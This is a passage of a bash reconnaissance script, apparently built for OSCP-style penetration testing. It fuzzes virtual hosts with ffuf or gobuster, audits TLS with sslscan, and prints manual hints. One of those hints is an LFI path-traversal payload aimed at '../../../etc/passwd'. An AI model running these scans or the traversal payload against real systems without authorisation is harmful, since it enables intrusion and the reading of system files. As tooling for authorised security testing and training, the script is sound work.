    info "[8/10] Virtual host fuzzing (Host header enumeration)"

    if [[ -z "$WL_VHOST" ]]; then
        warn "No vhost wordlist found — skipping vhost fuzzing."
        hint "Install seclists: sudo apt install seclists"

    elif command -v ffuf &>/dev/null; then
        # ── ffuf: measure baseline before fuzzing ──────────────────────
        info "Measuring baseline response size for unknown-host probe..."
        BASELINE_SIZE=$(
            curl -sk --max-time 8 \
                -H "Host: oscp-invalid-probe-$(date +%s).${EFFECTIVE_DOMAIN}" \
                -o /dev/null -w '%{size_download}' \
                "$BASE_URL" 2>/dev/null || echo 0
        )
        ok "Baseline size: ${WHITE}${BASELINE_SIZE}${NC} bytes (will be filtered from results)"

        cmd "ffuf -u ${BASE_URL}/ -H 'Host: FUZZ.${EFFECTIVE_DOMAIN}' -w ${WL_VHOST} -fs ${BASELINE_SIZE} -t 50 -mc 200,204,301,302,307,401,403"
        ffuf \
            -u "${BASE_URL}/" \
            -H "Host: FUZZ.${EFFECTIVE_DOMAIN}" \
            -w "$WL_VHOST" \
            -fs "$BASELINE_SIZE" \
            -t 50 \
            -mc "200,204,301,302,307,401,403" \
            -s \
            2>/dev/null | tee "$FFUF_VHOST_OUT" || true

        # Non-silent summary line for the operator
        VHOST_COUNT=$(grep -cE '\S' "$FFUF_VHOST_OUT" 2>/dev/null || echo 0)
        if [[ "$VHOST_COUNT" -gt 0 ]]; then
            ok "${RED}⚠  ffuf: ${VHOST_COUNT} virtual host(s) discovered!${NC} → ${FFUF_VHOST_OUT}"
            warn "Add each vhost to /etc/hosts and re-enumerate with --domain"
        else
            info "ffuf: no hidden vhosts found at baseline filter size ${BASELINE_SIZE}"
        fi

    elif command -v gobuster &>/dev/null; then
        # ── gobuster fallback ──────────────────────────────────────────
        info "ffuf not found — using gobuster vhost as fallback"
        cmd "gobuster vhost -u $BASE_URL -w $WL_VHOST --domain $EFFECTIVE_DOMAIN --append-domain -t 50 -k"
        gobuster vhost \
            -u "$BASE_URL" \
            -w "$WL_VHOST" \
            --domain "$EFFECTIVE_DOMAIN" \
            --append-domain \
            -t 50 -k \
            -o "$GOBUSTER_VHOST_OUT" 2>&1 | tee "${GOBUSTER_VHOST_OUT}.log" || true
        ok "Gobuster vhost done → ${WHITE}${GOBUSTER_VHOST_OUT}${NC}"

    else
        warn "Neither ffuf nor gobuster available — skipping vhost scan."
        hint "Install ffuf: sudo apt install ffuf"
    fi

else
    info "[8/10] No domain supplied and no hostname auto-detected — skipping vhost enumeration."
    hint "If you discover a hostname/domain, rerun with:
    bash wrappers/web_enum.sh --target ${TARGET} --output-dir <DIR> --port ${PORT} --domain <DOMAIN>"
fi
echo ""

# ===========================================================================
# 8 — SSLscan — TLS/SSL configuration audit (HTTPS ports only)
#
# Checks for: Heartbleed (CVE-2014-0160), SSLv2/SSLv3, POODLE, EXPORT
# cipher suites (FREAK/LOGJAM), TLS 1.0/1.1, weak RC4 ciphers, and
# certificate validity.
#
# --no-colour strips ANSI codes so the Python parser can read the file
# cleanly with plain regex.
# ===========================================================================
SSLSCAN_OUT="${WEB_DIR}/sslscan${SUFFIX}.txt"

if [[ "$PROTO" == "https" ]]; then
    info "[9/10] sslscan — TLS/SSL configuration audit"

    if command -v sslscan &>/dev/null; then
        cmd "sslscan --no-colour ${TARGET}:${PORT}"
        sslscan --no-colour "${TARGET}:${PORT}" > "$SSLSCAN_OUT" 2>&1 || true

        # Inline critical alerts — Python parser also surfaces these in notes.md
        if grep -qi 'Heartbleed.*vulnerable\|vulnerable.*Heartbleed' \
                "$SSLSCAN_OUT" 2>/dev/null; then
            warn "${RED}⚠  HEARTBLEED (CVE-2014-0160) DETECTED on port ${PORT}!${NC}"
            warn "   Memory leak — can expose private keys and credentials."
        fi
        if grep -qiE 'SSLv2.*enabled|SSLv3.*enabled' "$SSLSCAN_OUT" 2>/dev/null; then
            warn "Deprecated SSL protocol(s) enabled — check ${SSLSCAN_OUT}"
        fi

        ok "sslscan done → ${WHITE}${SSLSCAN_OUT}${NC}"
    else
        skip "sslscan"
        hint "Install: sudo apt install sslscan
    Then run: sslscan --no-colour ${TARGET}:${PORT} > ${SSLSCAN_OUT}"
    fi
else
    info "[9/10] HTTP port — sslscan skipped (HTTPS only)"
fi
echo ""

# ===========================================================================
# 10 — Manual-only hints (NO automation for these)
# ===========================================================================
info "[10/10] Additional manual steps required"

hint "LFI fuzzing — run manually with your wordlist:
    ffuf -u '${BASE_URL}/FUZZ' \\
         -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \\
         -mc 200 -ac -t 30 -fs 0

    # Parameter discovery:
    ffuf -u '${BASE_URL}/index.php?FUZZ=../../../etc/passwd' \\
         -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \\
         -mc 200 -ac -t 30 -fs 0"

hint "Nuclei (run manually — review templates before use):
    nuclei -u '${BASE_URL}' -severity medium,high,critical
    # IMPORTANT: Review which templates you run — exploit templates are NOT OSCP-compliant."

hint "Burp Suite — manual proxy testing:
    - Intercept and manually test all parameters for SQLi, XSS, LFI
    - Check authentication bypass on login forms
    - Test file upload endpoints for dangerous extensions"

# ===========================================================================
# Summary
# ===========================================================================
echo ""
echo -e "  ${BOLD}============================================================${NC}"
echo -e "  ${BOLD}  WEB ENUM SUMMARY — ${BASE_URL}${NC}"
echo -e "  ${BOLD}============================================================${NC}"
[[ -s "$WHATWEB_OUT" ]]          && echo "  [+] WhatWeb    : ${WHATWEB_OUT}"   || true
[[ -s "$GB_QUICK_OUT" ]]        && echo "  [+] Gobuster   : ${GB_QUICK_OUT}"  || true
[[ -s "$FEROX_OUT" ]]           && echo "  [+] Feroxbuster: ${FEROX_OUT}"     || true
[[ -s "$CGI_SNIPER_OUT" ]]      && echo "  [!] CGI Sniper : ${CGI_SNIPER_OUT}" || true
[[ -s "$FFUF_VHOST_OUT" ]]      && echo "  [!] VHost(ffuf): ${FFUF_VHOST_OUT}" || true
[[ -s "$GOBUSTER_VHOST_OUT" ]]  && echo "  [+] VHost(gb)  : ${GOBUSTER_VHOST_OUT}" || true
[[ -s "$SSLSCAN_OUT" ]]         && echo "  [+] SSLscan    : ${SSLSCAN_OUT}"   || true
[[ -s "$NIKTO_OUT" ]]           && echo "  [+] Nikto      : ${NIKTO_OUT}"     || true
[[ -n "$CMS_DETECTED" ]]        && echo "  [!] CMS        : ${CMS_DETECTED}"  || true
echo ""
ok "Web enumeration complete."
echo ""
